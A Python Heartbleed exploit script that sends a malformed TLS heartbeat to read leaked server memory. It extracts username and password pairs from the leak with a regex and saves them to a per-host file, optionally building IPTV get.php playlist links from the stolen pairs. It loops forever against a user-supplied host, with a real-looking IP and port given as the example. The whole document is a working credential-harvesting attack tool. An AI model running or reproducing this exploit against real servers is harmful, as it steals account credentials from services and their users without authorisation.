import sys
import struct
import socket
import time
import select
import binascii
import re

def h2bin(x):
    return binascii.unhexlify(x.replace(' ', '').replace('\n', ''))

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')

hb = h2bin(''' 
18 03 02 00 03
01 40 00
''')

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = b''
    remain = length
    while remain > 0:
        rtime = endtime - time.time() 
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], rtime)
        if s in r:
            data = s.recv(remain)
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata

def recvmsg(s, timeout=5):
    hdr = recvall(s, 5, timeout)
    if hdr is None:
        print('Unexpected EOF receiving record header - server closed connection')
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, timeout)
    if pay is None:
        print('Unexpected EOF receiving record payload - server closed connection')
        return None, None, None
    print(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
    return typ, ver, pay

def process_and_print_payload(data, host, port, real):
    filename = f"{host}_{port}.txt"
    processed_data = data.replace(b'..', b'  ')
    decoded_data = processed_data.decode('ascii', errors='ignore')

    # Updated pattern to specifically capture username and password parts
    pattern = re.compile(r'username=([^&]+)&password=([^&]+)')
    matches = pattern.findall(decoded_data)

    # Read existing data to filter out duplicates
    existing_data = set()
    try:
        with open(filename, 'r') as file:
            existing_data = set(file.readlines())
    except FileNotFoundError:
        pass  # If the file doesn't exist, proceed with an empty set

    with open(filename, 'a') as file:
        for username, password in matches:
            # Construct the string to write to the file
            if real:
                match_str = f"{real}/get.php?username={username}&password={password}&type=m3u_plus\n"
                print(f"\n{match_str}\n")
                if match_str not in existing_data:
                    file.write(match_str)
                    existing_data.add(match_str)  # Update the existing data set
            else:
                match_str = f"username={username}&password={password}\n"
                print(f"\n{match_str}\n")
                if match_str not in existing_data:
                    file.write(match_str)
                    existing_data.add(match_str)  # Update the existing data set

def hit_hb(s, host, port, real, timeout=5):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s, timeout)
        if typ is None:
            print('No heartbeat response received, server likely not vulnerable')
            return False

        if typ == 24:
            print('Received heartbeat response:')
            # Call the new processing function here with the payload
            process_and_print_payload(pay, host, port, real)
            if len(pay) > 3:
                print('WARNING: server returned more data than it should - server is vulnerable!')
                continue
            else:
                print('Server processed malformed heartbeat, but did not return any extra data.')
            return False

        if typ == 21:
            print('Received alert:')
            process_and_print_payload(pay, host, port, real)  # Process payload for alert messages as well
            print('Server returned error, likely not vulnerable')
            return False

def main(host, port, real, timeout=5):
    try:
        while True:  # Continuous loop for the specified host and port
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print('Connecting...')
            s.connect((host, port))
            print('Sending Client Hello...')
            s.send(hello)
            print('Waiting for Server Hello...')
            while True:
                typ, ver, pay = recvmsg(s, timeout)
                if typ is None:
                    print('Server closed connection without sending Server Hello.')
                    s.close()
                    break
                if typ == 22 and pay[0] == 0x0E:  # Server Hello Done message
                    break

            print('Sending heartbeat request...')
            hit_hb(s, host, port, real, timeout)
            s.close()
            print("Sleeping for a few seconds before retrying...")
            time.sleep(3)  # Adjust sleep time as needed

    except KeyboardInterrupt:
        print("Exiting...")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == '__main__':
    input_line = input('Enter host and port (e.g., "188.241.219.18:25463"), or type "quit" to exit: ').strip()
    if input_line.lower() != 'quit':
        pattern = r'([^:]+):(\d+)'
        match = re.search(pattern, input_line)
        if match:
            host = match.group(1)
            port = int(match.group(2))
            real = str(input("Enter the stream URL: "))
            timeout = 15  # Default timeout
            main(host, port, real, timeout)
        else:
            print("Invalid input format. Please use the correct format.")